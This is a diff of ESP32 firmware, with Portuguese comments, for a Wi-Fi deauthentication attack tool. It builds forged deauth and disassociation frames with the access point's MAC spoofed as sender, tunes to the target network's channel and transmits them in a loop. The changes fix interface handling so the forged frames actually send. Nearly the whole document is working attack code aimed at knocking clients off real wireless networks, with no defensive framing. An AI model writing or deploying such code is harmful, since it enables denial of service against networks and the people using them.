@@ -4,17 +4,9 @@
 
 // ============================================================
 // DEAUTH / DISASSOC FRAMES
-// 
-// Frame Control: 0xC0 = Deauth, 0xA0 = Disassoc
-// Duration: 0x3A, 0x01 = 314us (padrão)
-// DA: Destination Address
-// SA: Source Address (AP MAC)
-// BSSID: BSSID (AP MAC)
-// Seq Ctrl: deixado em 0x00, 0x00 (driver incrementa com en_sys_seq=true)
-// Reason Code: 0x01, 0x00 = Unspecified reason
 // ============================================================
 
-// Deauth: AP -> Broadcast (todos os clientes)
+// Deauth: AP -> Broadcast
 static uint8_t deauthFrame[26] = {
     0xC0, 0x00,             // Frame Control: Deauth
     0x3A, 0x01,             // Duration
@@ -22,7 +14,7 @@ static uint8_t deauthFrame[26] = {
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC [10]
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
     0x00, 0x00,             // Seq Ctrl [22] - DRIVER INCREMENTA
-    0x01, 0x00              // Reason Code: 1 = Unspecified [24]
+    0x01, 0x00              // Reason: 1 = Unspecified [24]
 };
 
 // Deauth: AP -> STA (direcionado)
@@ -55,7 +47,7 @@ static uint8_t disassocFrame[26] = {
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00,
-    0x01, 0x00              // Reason: 1 = Unspecified
+    0x01, 0x00
 };
 
 // ============================================================
@@ -82,9 +74,14 @@ void setMAC(uint8_t* frame, uint8_t* mac, int offset) {
 // ============================================================
 void scanNetworks() {
     networkCount = 0;
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect(true);
-    delay(200);
+
+    // MODO CRÍTICO: NÃO desconecta completamente!
+    // Apenas garante modo STA - interface deve permanecer ativa
+    if (WiFi.getMode() != WIFI_STA) {
+        WiFi.mode(WIFI_STA);
+    }
+    // NÃO chama WiFi.disconnect(true) aqui - isso invalida a interface!
+    delay(100);
 
     int n = WiFi.scanNetworks(false, true);
     Serial.printf("[WiFi] Scan found %d networks\n", n);
@@ -96,10 +93,8 @@ void scanNetworks() {
         scannedNetworks[i].rssi = WiFi.RSSI(i);
         scannedNetworks[i].channel = WiFi.channel(i);
         scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
-        Serial.printf("[WiFi] %d: %s CH%d RSSI%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
-            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi,
-            scannedNetworks[i].bssid[0], scannedNetworks[i].bssid[1], scannedNetworks[i].bssid[2],
-            scannedNetworks[i].bssid[3], scannedNetworks[i].bssid[4], scannedNetworks[i].bssid[5]);
+        Serial.printf("[WiFi] %d: %s CH%d RSSI%d\n",
+            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi);
         networkCount++;
     }
     WiFi.scanDelete();
@@ -138,29 +133,42 @@ void startDeauth(uint8_t networkIndex) {
 
     setMAC(deauthFrameFromSTA, target->bssid, 4);   // DA = AP
     setMAC(deauthFrameFromSTA, target->bssid, 16);  // BSSID = AP
-    // SA = broadcast (vamos usar o MAC do AP também para spoofing)
-    setMAC(deauthFrameFromSTA, target->bssid, 10);
+    setMAC(deauthFrameFromSTA, target->bssid, 10);  // SA = AP (spoof)
 
     setMAC(disassocFrame, target->bssid, 10);
     setMAC(disassocFrame, target->bssid, 16);
 
-    // === PREPARA WIFI ===
+    // === PREPARA WIFI - ORDEM CRÍTICA ===
+    // 1. Modo STA (interface já deve estar ativa)
     WiFi.mode(WIFI_STA);
-    WiFi.disconnect(true);
-    delay(100);
+    delay(50);
 
-    // Promiscuous mode ON
+    // 2. NÃO desconecta! A interface STA precisa estar "up"
+    //    para esp_wifi_80211_tx funcionar.
+    //    WiFi.disconnect(true) DESTRÓI a interface!
+    //    Apenas garante que não estamos conectados a nenhum AP
+    if (WiFi.status() == WL_CONNECTED) {
+        WiFi.disconnect(false);  // false = não apaga configuração da interface
+        delay(100);
+    }
+
+    // 3. Desliga power save para TX máximo
+    esp_wifi_set_ps(WIFI_PS_NONE);
+
+    // 4. MUDA PARA O CANAL DO ALVO
+    esp_err_t chErr = esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
+    Serial.printf("[Deauth] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
+        target->ssid, target->channel,
+        target->bssid[0], target->bssid[1], target->bssid[2],
+        target->bssid[3], target->bssid[4], target->bssid[5]);
+    Serial.printf("[Deauth] Set channel result: %d\n", chErr);
+
+    // 5. Promiscuous mode APÓS configurar tudo
+    //    (algumas versões do driver precisam disso)
     esp_wifi_set_promiscuous(true);
     delay(50);
 
-    // Desliga power save
-    esp_wifi_set_ps(WIFI_PS_NONE);
-
-    // MUDA PARA O CANAL DO ALVO
-    esp_err_t chErr = esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
-    Serial.printf("[Deauth] Target: %s CH%d\n", target->ssid, target->channel);
-    Serial.printf("[Deauth] Set channel result: %d\n", chErr);
-
+    // Reseta contadores
     deauthActive = true;
     deauthPacketCount = 0;
     deauthSuccessCount = 0;
@@ -181,20 +189,23 @@ void stopDeauth() {
 }
 
 // ============================================================
-// LOOP DE DEAUTH - CORRIGIDO
-// 
-// MUDANÇAS CRÍTICAS:
-// 1. en_sys_seq = true (driver incrementa sequence number)
-// 2. Sem delay() entre frames (deixa o driver gerenciar)
-// 3. Apenas 1 frame por chamada (evita encher fila do driver)
-// 4. Alterna entre 4 tipos de frames para máxima efetividade
+// LOOP DE DEAUTH
 // ============================================================
 bool deauthLoop() {
     if (!deauthActive) return false;
 
     static uint8_t cycle = 0;
     bool anySuccess = false;
-    esp_err_t err = ESP_OK;
+    esp_err_t err = ESP_FAIL;
+
+    // Verifica se a interface ainda está válida
+    wifi_mode_t mode;
+    esp_wifi_get_mode(&mode);
+    if (mode != WIFI_MODE_STA) {
+        Serial.printf("[Deauth] WARN: WiFi mode=%d, resetting to STA\n", mode);
+        WiFi.mode(WIFI_STA);
+        delay(50);
+    }
 
     // Alterna entre 4 tipos de frames
     switch (cycle % 4) {
@@ -219,9 +230,13 @@ bool deauthLoop() {
     } else {
         lastDeauthError = err;
         deauthFailCount++;
-        // Loga os primeiros erros para debug
-        if (deauthFailCount <= 5) {
-            Serial.printf("[Deauth] TX ERR cycle=%d err=%d\n", cycle % 4, err);
+        // Loga erros para debug
+        if (deauthFailCount <= 10 || deauthFailCount % 50 == 0) {
+            Serial.printf("[Deauth] TX ERR cycle=%d err=%d (%s)\n", 
+                cycle % 4, err, 
+                err == ESP_ERR_WIFI_IF ? "invalid interface" :
+                err == ESP_ERR_INVALID_ARG ? "invalid arg" :
+                err == ESP_ERR_WIFI_TIMEOUT ? "timeout" : "unknown");
         }
     }
     deauthPacketCount++;
